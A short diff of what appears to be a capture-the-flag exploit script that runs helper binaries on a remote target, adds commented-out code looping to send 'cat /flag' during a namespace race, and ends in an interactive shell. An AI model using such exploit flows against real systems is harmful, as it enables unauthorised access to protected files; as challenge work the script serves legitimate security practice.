@@ -98,7 +98,14 @@ def main():
     run_elf(r, 0, "makens")
     time.sleep(3)
     run_elf(r, 0, "sleep")
-    wait()
+    # sleep(1)
+    # for i in range(10):
+    #     r.recvuntil("entering namespaces of pid 2")
+    #     # if r.recvline() == b"chal: setresgid: Invalid argument":
+    #     r.sendline("cat /flag")
+    #     r.recvline()
+    #     run_elf(r,0,"empty")
+    # wait()
     r.interactive()
 
 if __name__ == "__main__":
